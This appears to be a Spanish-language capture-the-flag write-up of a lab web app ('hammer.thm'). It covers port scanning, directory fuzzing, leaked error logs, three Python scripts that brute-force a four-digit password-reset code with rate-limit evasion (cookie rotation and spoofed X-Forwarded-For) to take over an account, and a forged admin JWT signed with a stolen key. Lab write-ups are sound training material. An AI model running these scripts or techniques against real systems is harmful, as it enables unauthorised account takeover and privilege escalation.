
## Recon

```
root@ip-10-10-111-238:~# nmap -T5 -n -Pn -p- 10.10.74.36 -v
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-03 16:49 GMT
Initiating ARP Ping Scan at 16:49
Scanning 10.10.74.36 [1 port]
Completed ARP Ping Scan at 16:49, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:49
Scanning 10.10.74.36 [65535 ports]
Discovered open port 22/tcp on 10.10.74.36
Discovered open port 1337/tcp on 10.10.74.36
Completed SYN Stealth Scan at 16:49, 2.89s elapsed (65535 total ports)
Nmap scan report for 10.10.74.36
Host is up (0.00032s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste
MAC Address: 02:08:4B:6D:F3:F3 (Unknown)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.28 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)

```

## Puerto 1337
```html


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link href="/hmr_css/bootstrap.min.css" rel="stylesheet">
    
	<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->


</head>
<body>
<div class="container mt-5">
    <div class="row justify-content-center">
        <div class="col-md-4">
            <h3 class="text-center">Login</h3>
                        <form method="POST" action="">
                <div class="mb-3">
                    <label for="email" class="form-label">Email</label>
                    <input type="text" class="form-control" id="email" name="email" required>
                </div>
                <div class="mb-3">
                    <label for="password" class="form-label">Password</label>
                    <input type="password" class="form-control" id="password" name="password" required>
                </div>
                <button type="submit" class="btn btn-primary w-100">Login</button>
                <div class="mt-3 text-center">
                    <a href="reset_password.php">Forgot your password?</a>
                </div>
            </form>
        </div>
    </div>
</div>
</body>
</html>

```

## Fuzzing de directorios

```


ffuf -u http://10.10.74.36:1337/hmr_FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -ic -v

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.74.36:1337/hmr_FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

[Status: 301, Size: 319, Words: 20, Lines: 10]
| URL | http://10.10.74.36:1337/hmr_css
| --> | http://10.10.74.36:1337/hmr_css/
    * FUZZ: css

[Status: 301, Size: 318, Words: 20, Lines: 10]
| URL | http://10.10.74.36:1337/hmr_js
| --> | http://10.10.74.36:1337/hmr_js/
    * FUZZ: js

[Status: 301, Size: 322, Words: 20, Lines: 10]
| URL | http://10.10.74.36:1337/hmr_images
| --> | http://10.10.74.36:1337/hmr_images/
    * FUZZ: images

[Status: 301, Size: 320, Words: 20, Lines: 10]
| URL | http://10.10.74.36:1337/hmr_logs
	| --> | http://10.10.74.36:1337/hmr_logs/
    * FUZZ: logs

:: Progress: [218265/218265] :: Job [1/1] :: 8979 req/sec :: Duration: [0:00:30] :: Errors: 0 ::

```

## Analizando directorios
```
http://10.10.74.36:1337/hmr_logs/error.logs

[Mon Aug 19 12:00:01.123456 2024] [core:error] [pid 12345:tid 139999999999999] [client 192.168.1.10:56832] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow
[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php
[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
[Mon Aug 19 12:07:29.321098 2024] [core:error] [pid 12352:tid 139999999999992] [client 192.168.1.35:42310] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down
```

## Probamos reset password

- Usando el usuario que encontramos en los logs, analizamos la opción de rest password

```html


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reset Password</title>
     <link href="/hmr_css/bootstrap.min.css" rel="stylesheet">
    <script src="/hrm_js/jquery-3.6.0.min.js"></script>
	    <script>
	let countdownv = ;
        function startCountdown() {
            
            let timerElement = document.getElementById("countdown");
			const hiddenField = document.getElementById("s");
            let interval = setInterval(function() {
                countdownv--;
				 hiddenField.value = countdownv;
                if (countdownv <= 0) {
                    clearInterval(interval);
					//alert("hello");
                   window.location.href = 'logout.php'; 
                }
                timerElement.textContent = "You have " + countdownv + " seconds to enter your code.";
            }, 1000);
        }
    </script>
</head>
<body>
<div class="container mt-5">
    <div class="row justify-content-center">
        <div class="col-md-4">
            
                            <h3 class="text-center">Reset Password</h3>
                <form method="POST" action="">
                    <div class="mb-3">
                        <label for="email" class="form-label">Email</label>
                        <input type="text" class="form-control" id="email" name="email" required>
                    </div>
                    <button type="submit" class="btn btn-primary w-100">Submit</button> 
                </form>

                    </div>
    </div>
</div>
</body>
</html>

```

### Script para sobrepasar el reseteo

```python
import subprocess

def get_phpsessid():
    # Request Password Reset and retrieve the PHPSESSID cookie
    reset_command = [
        "curl", "-X", "POST", "http://hammer.thm:1337/reset_password.php",
        "-d", "email=tester%40hammer.thm",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-v"
    ]

    # Execute the curl command and capture the output
    response = subprocess.run(reset_command, capture_output=True, text=True)

    # Extract PHPSESSID from the response
    phpsessid = None
    for line in response.stderr.splitlines():
        if "Set-Cookie: PHPSESSID=" in line:
            phpsessid = line.split("PHPSESSID=")[1].split(";")[0]
            break

    return phpsessid

def submit_recovery_code(phpsessid, recovery_code):
    # Submit Recovery Code using the retrieved PHPSESSID
    recovery_command = [
        "curl", "-X", "POST", "http://hammer.thm:1337/reset_password.php",
        "-d", f"recovery_code={recovery_code}&s=180",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", f"Cookie: PHPSESSID={phpsessid}",
        "--silent"
    ]

    # Execute the curl command for recovery code submission
    response_recovery = subprocess.run(recovery_command, capture_output=True, text=True)
    return response_recovery.stdout

def main():
    phpsessid = get_phpsessid()
    if not phpsessid:
        print("Failed to retrieve initial PHPSESSID. Exiting...")
        return
    
    for i in range(10000):
        recovery_code = f"{i:04d}"  # Format the recovery code as a 4-digit string

        if i % 7 == 0:  # Every 7th request, get a new PHPSESSID
            phpsessid = get_phpsessid()
            if not phpsessid:
                print(f"Failed to retrieve PHPSESSID at attempt {i}. Retrying...")
                continue
        
        response_text = submit_recovery_code(phpsessid, recovery_code)
        word_count = len(response_text.split())

        if word_count != 148:
            print(f"Success! Recovery Code: {recovery_code}")
            print(f"PHPSESSID: {phpsessid}")
            print(f"Response Text: {response_text}")
            break

if __name__ == "__main__":
    main()

```

## otra forma

```python
#!/usr/bin/env python3
import requests
import random
import threading

url = "http://10.10.63.156:1337/reset_password.php"
stop_flag = threading.Event()
num_threads = 50

def brute_force_code(session, start, end):
    for code in range(start, end):
        code_str = f"{code:04d}"
        try:
            r = session.post(
                url,
                data={"recovery_code": code_str, "s": "180"},
                headers={
                    "X-Forwarded-For": f"127.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}"
                },
                allow_redirects=False,
            )
            if stop_flag.is_set():
                return
            elif r.status_code == 302:
                stop_flag.set()
                print("[-] Timeout reached. Try again.")
                return
            else:
                if "Invalid or expired recovery code!" not in r.text:
                    stop_flag.set()
                    print(f"[+] Found the recovery code: {code_str}")
                    print("[+] Printing the response: ")
                    print(r.text)
                    return
        except Exception as e:
            #print(e)
            pass

def main():
    session = requests.Session()
    print("[+] Sending the password reset request.")
    session.post(url, data={"email": "tester@hammer.thm"})
    print("[+] Starting the code brute-force.")
    code_range = 10000
    step = code_range // num_threads
    threads = []
    for i in range(num_threads):
        start = i * step
        end = start + step
        thread = threading.Thread(target=brute_force_code, args=(session, start, end))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
```

modificado para enviar el password

```python
#!/usr/bin/env python3
import requests
import random
import threading

url = "http://10.10.63.156:1337/reset_password.php"
stop_flag = threading.Event()
num_threads = 50

def brute_force_code(session, start, end):
    for code in range(start, end):
        code_str = f"{code:04d}"
        try:
            r = session.post(
                url,
                data={"recovery_code": code_str, "s": "180"},
                headers={
                    "X-Forwarded-For": f"127.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}"
                },
                allow_redirects=False,
            )
            if stop_flag.is_set():
                return
            elif r.status_code == 302:
                stop_flag.set()
                print("[-] Timeout reached. Try again.")
                return
            else:
                if "Invalid or expired recovery code!" not in r.text and "new_password" in r.text:
                    stop_flag.set()
                    print(f"[+] Found the recovery code: {code_str}")
                    print("[+] Sending the new password request.")
                    new_password = "password123"
                    session.post(
                        url,
                        data={
                            "new_password": new_password,
                            "confirm_password": new_password,
                        },
                        headers={
                            "X-Forwarded-For": f"127.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}"
                        },
                    )
                    print(f"[+] Password is set to {new_password}")
                    return
        except Exception as e:
            # print(e)
            pass

def main():
    session = requests.Session()
    print("[+] Sending the password reset request.")
    session.post(url, data={"email": "tester@hammer.thm"})
    print("[+] Starting the code brute-force.")
    code_range = 10000
    step = code_range // num_threads
    threads = []
    for i in range(num_threads):
        start = i * step
        end = start + step
        thread = threading.Thread(target=brute_force_code, args=(session, start, end))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
```

## Ejecutar comandos con jwt token adecuado

Podemos ejecutar comandos pero limitado, va un token jwt que hay que forjar con derechos de admin y firmar con la llave en el root

```
cat 188ade1.key 
56058354efb3daa97ebab00fabd7a7d7  
```

```json
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/html/188ade1.key"
}
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1741133777,
  "exp": 1741137377,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "admin"
  }
}
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  56058354efb3daa97ebab00fabd7a7d7
) secret base64 encoded
```